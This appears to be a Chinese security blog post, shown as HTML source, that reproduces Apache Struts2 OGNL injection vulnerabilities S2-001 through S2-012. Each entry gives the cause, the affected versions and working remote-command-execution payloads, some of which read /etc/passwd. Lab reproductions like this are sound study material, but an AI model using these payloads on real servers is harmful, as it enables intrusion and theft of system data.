@@ -1,0 +1,266 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>struts2系列漏洞复现 | micgo's blog</title><meta name="keywords" content="java security"><meta name="author" content="micgo"><meta name="copyright" content="micgo"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="S2-001(CVE-2007-4556)该漏洞因为用户提交表单数据并且验证失败时，后端会将用户之前提交的参数值使用 OGNL 表达式 %{value} 进行解析，然后重新填充到对应的表单数据中。例如注册或登录页面，提交失败后端一般会默认返回之前提交的数据，由于后端使用         %{value} 对提交的数据执行了一次 OGNL 表达式解析，所以可以直接构造 Payload 进行命令执行">
+<meta property="og:type" content="article">
+<meta property="og:title" content="struts2系列漏洞复现">
+<meta property="og:url" content="https://micgo.top/java-security/struts2%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/index.html">
+<meta property="og:site_name" content="micgo&#39;s blog">
+<meta property="og:description" content="S2-001(CVE-2007-4556)该漏洞因为用户提交表单数据并且验证失败时，后端会将用户之前提交的参数值使用 OGNL 表达式 %{value} 进行解析，然后重新填充到对应的表单数据中。例如注册或登录页面，提交失败后端一般会默认返回之前提交的数据，由于后端使用         %{value} 对提交的数据执行了一次 OGNL 表达式解析，所以可以直接构造 Payload 进行命令执行">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/20201009112151822.jpg">
+<meta property="article:published_time" content="2023-02-21T16:00:00.000Z">
+<meta property="article:modified_time" content="2023-02-25T13:50:35.117Z">
+<meta property="article:author" content="micgo">
+<meta property="article:tag" content="java security">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/20201009112151822.jpg"><link rel="shortcut icon" href="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20230225215514.jpg"><link rel="canonical" href="https://micgo.top/java-security/struts2%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'struts2系列漏洞复现',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-02-25 21:50:35'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="micgo's blog" type="application/atom+xml">
+</head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20230225215514.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">23</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">19</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">7</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/20201009112151822.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">micgo's blog</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">struts2系列漏洞复现</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-02-21T16:00:00.000Z" title="发表于 2023-02-22 00:00:00">2023-02-22</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-02-25T13:50:35.117Z" title="更新于 2023-02-25 21:50:35">2023-02-25</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/java-security/">java security</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="struts2系列漏洞复现"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h4 id="S2-001-CVE-2007-4556"><a href="#S2-001-CVE-2007-4556" class="headerlink" title="S2-001(CVE-2007-4556)"></a>S2-001(CVE-2007-4556)</h4><p>该漏洞因为用户提交表单数据并且验证失败时，<strong>后端会将用户之前提交的参数值使用 OGNL 表达式 %{value} 进行解析，然后重新填充到对应的表单数据中</strong>。例如注册或登录页面，提交失败后端一般会默认返回之前提交的数据，由于后端使用         %{value} 对提交的数据执行了一次 OGNL 表达式解析，所以可以直接构造 Payload 进行命令执行</p>
+<p>先来测试一下是否真的存在远程代码执行</p>
+<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230223105112421.png" alt="image-20230223105112421" style="zoom: 39%;" />
+
+<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230223105140128.png" alt="image-20230223105140128" style="zoom:39%;" />
+
+<p>发现都把password中括号里的值返回来了</p>
+<p>这样构造如下payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;&quot;tomcatBinDir&#123;&quot;+@java.lang.System@getProperty(&quot;user.dir&quot;)+&quot;&#125;&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230223105234298.png" alt="image-20230223105234298" style="zoom:50%;" />
+
+<p>语句被执行，查看返回的语句是&#x2F;user&#x2F;local&#x2F;tomcat即使tomcat的执行语句；</p>
+<p>然后获取web路径，构造如下语句</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">%&#123;</span><br><span class="line">#req=@org.apache.struts2.ServletActionContext@getRequest(),</span><br><span class="line">#response=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter(),</span><br><span class="line">#response.println(#req.getRealPath(&#x27;/&#x27;)),</span><br><span class="line">#response.flush(),</span><br><span class="line">#response.close()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230223105303991.png" alt="image-20230223105303991" style="zoom:50%;" />
+
+<p>可见返回了web路径,为&#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;webapps&#x2F;ROOT</p>
+<p>查看当前权限，返回的是root</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">%&#123;</span><br><span class="line">#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;whoami&quot;&#125;)).redirectErrorStream(true).start(),</span><br><span class="line">#b=#a.getInputStream(),</span><br><span class="line">#c=new java.io.InputStreamReader(#b),</span><br><span class="line">#d=new java.io.BufferedReader(#c),</span><br><span class="line">#e=new char[50000],</span><br><span class="line">#d.read(#e),</span><br><span class="line">#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),</span><br><span class="line">#f.getWriter().println(new java.lang.String(#e)),</span><br><span class="line">#f.getWriter().flush(),#f.getWriter().close()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+<p>执行任意命令时只需要，将whoami的命令替换，例如如下内容</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">%&#123;</span><br><span class="line">#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;&quot;cat&quot;,&quot;/etc/passwd&quot;&#125;)).redirectErrorStream(true).start(),</span><br><span class="line">#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),</span><br><span class="line">#d=new java.io.BufferedReader(#c),</span><br><span class="line">#e=new char[50000],#d.read(#e),</span><br><span class="line">#f=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;),</span><br><span class="line">#f.getWriter().println(new java.lang.String(#e)),</span><br><span class="line">#f.getWriter().flush(),</span><br><span class="line">#f.getWriter().close()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230223105339077.png" alt="image-20230223105339077" style="zoom:50%;" />
+
+<p>至此漏洞复现完成</p>
+<p><strong>修复方式</strong>：<br>改变 OGNL表达式的解析方法从而不会产生递归解析，用户的输入也不会再解析执行</p>
+<h4 id="S2-005"><a href="#S2-005" class="headerlink" title="S2-005"></a>S2-005</h4><p>s2-005漏洞的起源源于s2-003（受影响版本：低于Struts2.0.12）, struts2会将http的每个参数名解析为OGNL语句执行（可理解为Java代码）</p>
+<p>OGNL表达式通过#来访问struts的对象，struts框架通过过滤#字符防止安全问题，然而通过unicode编码（\u0023)或8进制（\43）即绕过了安全限制。对于S2-003漏洞，官方通过增加安全配置（禁止静态方法调用和类方法执行等）来修补，但是安全配置被绕过再次导致了漏洞，攻击者可以利用OGNL表达式将这两个选项打开，S2-003的修补方式把自己上了一个锁，但是把钥匙插在了锁头上</p>
+<p><strong>影响版本</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Struts 2.0.0-2.1.8.1</span><br></pre></td></tr></table></figure>
+
+<p><strong>绕过过程</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. 在S2-003中\u0023用于绕过struts2的过滤器#</span><br><span class="line">2. 在S2-003 struts2添加安全模式（沙盒）之后</span><br><span class="line">3. 在S2-005中，使用OGNL表达式关闭安全模式并再次绕过</span><br></pre></td></tr></table></figure>
+
+<p><strong>漏洞利用exp</strong></p>
+<p>直接GET方法访问，执行任意命令POC（无回显，空格用@代替）：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/example/HelloWorld.action?(%27%5cu0023_memberAccess[%5c%27allowStaticMethodAccess%5c%27]%27)(vaaa)=true&amp;(aaaa)((%27%5cu0023context[%5c%27xwork.MethodAccessor.denyMethodExecution%5c%27]%5cu003d%5cu0023vccc%27)(%5cu0023vccc%5cu003dnew%20java.lang.Boolean(%22false%22)))&amp;(asdf)((&#x27;%5cu0023rt.exec(%22touch@/tmp/success%22.split(%22@%22))&#x27;)(%5cu0023rt%5cu003d@java.lang.Runtime@getRuntime()))=1</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="s2-007"><a href="#s2-007" class="headerlink" title="s2-007"></a>s2-007</h4><p>当配置了验证规则 <code>&lt;ActionName&gt;-validation.xml</code> 时，若类型验证转换出错，后端默认会将用户提交的表单值通过字符串拼接，然后执行一次 OGNL 表达式解析并返回</p>
+<p>例如这里有一个 <code>UserAction</code>：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">(...)</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserAction</span> <span class="keyword">extends</span> <span class="title class_">ActionSupport</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Integer age;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> String email;</span><br><span class="line">(...)</span><br></pre></td></tr></table></figure>
+
+<p>然后配置有 <code>UserAction-validation.xml</code>：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">validators</span> <span class="keyword">PUBLIC</span></span></span><br><span class="line"><span class="meta">    <span class="string">&quot;-//OpenSymphony Group//XWork Validator 1.0//EN&quot;</span></span></span><br><span class="line"><span class="meta">    <span class="string">&quot;http://www.opensymphony.com/xwork/xwork-validator-1.0.2.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">validators</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;age&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">field-validator</span> <span class="attr">type</span>=<span class="string">&quot;int&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">&quot;min&quot;</span>&gt;</span>1<span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">&quot;max&quot;</span>&gt;</span>150<span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">field-validator</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">field</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">validators</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>当用户提交 age 为字符串而非整形数值时，后端用代码拼接 <strong><code>&quot;&#39;&quot; + value + &quot;&#39;&quot;</code></strong> 然后对其进行 OGNL 表达式解析。要成功利用，只需要找到一个配置了类似验证规则的表单字段使之转换出错，借助类似 SQL注入单引号拼接的方式即可注入任意 OGNL 表达式</p>
+<p><strong>影响范围</strong></p>
+<ul>
+<li>2.0.0 - 2.2.3</li>
+</ul>
+<p><strong>漏洞利用exp</strong></p>
+<p>给出执行任意代码的EXP：</p>
+<figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; + (#_memberAccess[<span class="string">&quot;allowStaticMethodAccess&quot;</span>]=<span class="literal">true</span>,#foo=<span class="keyword">new</span> java.lang.<span class="type">Boolean</span>(<span class="string">&quot;false&quot;</span>) ,#context[<span class="string">&quot;xwork.MethodAccessor.denyMethodExecution&quot;</span>]=#foo,<span class="meta">@org</span>.apache.commons.io.<span class="type">IOUtils</span><span class="meta">@toString</span>(<span class="meta">@java</span>.lang.<span class="type">Runtime</span><span class="meta">@getRuntime</span>().exec(&#x27;id&#x27;).getInputStream())) + &#x27;</span><br></pre></td></tr></table></figure>
+
+<p>将Exp传入可以利用的输入框，得到命令执行结果：</p>
+<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230223112530925.png" alt="image-20230223112530925" style="zoom: 50%;" />
+
+<h4 id="S2-008-CVE-2012-0391"><a href="#S2-008-CVE-2012-0391" class="headerlink" title="S2-008(CVE-2012-0391)"></a>S2-008(CVE-2012-0391)</h4><p><code>devMode</code>下支持直接执行OGNL表达式，Cookie 拦截器错误配置可造成 OGNL 表达式执行，生产环境一般不会存在该漏洞，但是开了debug模式就可以直接执行命令<br>由于debug模式本身就不该开放在生产模式，因此由debug模式引发的漏洞并没有对应的修复方案.</p>
+<p><strong>影响范围</strong></p>
+<ul>
+<li>Struts 2.1.0 - Struts 2.3.1</li>
+</ul>
+<p><strong>漏洞利用exp</strong></p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/devmode.action?debug=command&amp;expression=(%23_memberAccess[<span class="string">&quot;allowStaticMethodAccess&quot;</span>]%<span class="number">3</span>dtrue%<span class="number">2</span>c%23foo%3dnew+java.lang.Boolean(<span class="string">&quot;false&quot;</span>)+%<span class="number">2</span>c%23context[<span class="string">&quot;xwork.MethodAccessor.denyMethodExecution&quot;</span>]%<span class="number">3</span>d%23foo%<span class="number">2</span>c%40org.apache.commons.io.IOUtils%40toString(%40java.lang.Runtime%40getRuntime().exec(<span class="string">&#x27;ls+-al+./&#x27;</span>).getInputStream()))</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://img2023.cnblogs.com/blog/3076168/202301/3076168-20230108204630588-1489659374.png"><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230223112840676.png" alt="image-20230223112840676"></a></p>
+<h4 id="S2-009-CVE-2011-3923"><a href="#S2-009-CVE-2011-3923" class="headerlink" title="S2-009(CVE-2011-3923)"></a>S2-009(CVE-2011-3923)</h4><p>这个漏洞跟s2-003 s2-005 属于一套的, Struts2对s2-003的修复方法是禁止#号，于是s2-005通过使用编码\u0023或\43来绕过；Struts2对s2-005的修复方法是禁止 \ 等特殊符号，使用户不能提交反斜线。 但是，如果当前action中接受了某个参数example，这个参数将进入OGNL的上下文。所以，我们可以将OGNL表达式放在example参数中，然后使用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/HelloWorld.acton?example=&amp;(example)(&#x27;xxx&#x27;)=1 </span><br></pre></td></tr></table></figure>
+
+<p> 的方法来执行它，从而绕过官方对 #、\ 等特殊字符的防护。</p>
+<p><strong>影响范围</strong></p>
+<ul>
+<li>2.1.0 - 2.3.1.1</li>
+</ul>
+<p><strong>漏洞利用exp</strong></p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/ajax/example5.action?age=<span class="number">12313</span>&amp;name=(%23context[%22xwork.MethodAccessor.denyMethodExecution%22]=+new+java.lang.Boolean(false),+%23_memberAccess[%22allowStaticMethodAccess%22]=true,+%23a=@java.lang.Runtime@getRuntime().exec(%27id%27).getInputStream(),%23b=new+java.io.InputStreamReader(%23a),%23c=new+java.io.BufferedReader(%23b),%23d=new+char[<span class="number">51020</span>],%23c.read(%23d),%23kxlzx=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23kxlzx.println(%23d),%23kxlzx.close())(meh)&amp;z[(name)(%27meh%27)]</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230223113846295.png" alt="image-20230223113846295"></p>
+<h4 id="S2-012"><a href="#S2-012" class="headerlink" title="S2-012"></a>S2-012</h4><p>如果在配置 Action 中 Result 时使用了重定向类型，并且还使用 ${param_name} 作为重定向变量，例如：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">package</span> <span class="attr">name</span>=<span class="string">&quot;S2-012&quot;</span> <span class="attr">extends</span>=<span class="string">&quot;struts-default&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">action</span> <span class="attr">name</span>=<span class="string">&quot;user&quot;</span> <span class="attr">class</span>=<span class="string">&quot;com.demo.action.UserAction&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">&quot;redirect&quot;</span> <span class="attr">type</span>=<span class="string">&quot;redirect&quot;</span>&gt;</span>/index.jsp?name=$&#123;name&#125;<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">&quot;input&quot;</span>&gt;</span>/index.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">&quot;success&quot;</span>&gt;</span>/index.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">package</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这里 <code>UserAction</code> 中定义有一个 name 变量，当触发 redirect 类型返回时，Struts2 获取使用 ${name} 获取其值，在这个过程中会对 name 参数的值执行 OGNL 表达式解析，从而可以插入任意 OGNL 表达式导致命令执行</p>
+<p><strong>影响范围</strong></p>
+<ul>
+<li>2.1.0 - 2.3.13</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%25%7B%23a%3D(new java.lang.ProcessBuilder(new java.lang.String%5B%5D%7B%22%2Fbin%2Fbash%22%2C%22-c%22%2C %22ls%22%7D)).redirectErrorStream(true).start()%2C%23b%3D%23a.getInputStream()%2C%23c%3Dnew java.io.InputStreamReader(%23b)%2C%23d%3Dnew java.io.BufferedReader(%23c)%2C%23e%3Dnew char%5B50000%5D%2C%23d.read(%23e)%2C%23f%3D%23context.get(%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22)%2C%23f.getWriter().println(new java.lang.String(%23e))%2C%23f.getWriter().flush()%2C%23f.getWriter().close()%7D</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230223115016179.png" alt="image-20230223115016179"></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://micgo.top">micgo</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://micgo.top/java-security/struts2%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">https://micgo.top/java-security/struts2%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用<meta name="referrer" content="no-referrer"> <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://micgo.top" target="_blank">micgo's blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/java-security/">java security</a></div><div class="post_share"><div class="social-share" data-image="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/20201009112151822.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/burp%E6%8F%92%E4%BB%B6/"><img class="prev-cover" src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/20201009112151822.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">burp插件</div></div></a></div><div class="next-post pull-right"><a href="/java-security/java%E5%9F%BA%E7%A1%80/"><img class="next-cover" src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/20201009112151822.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div 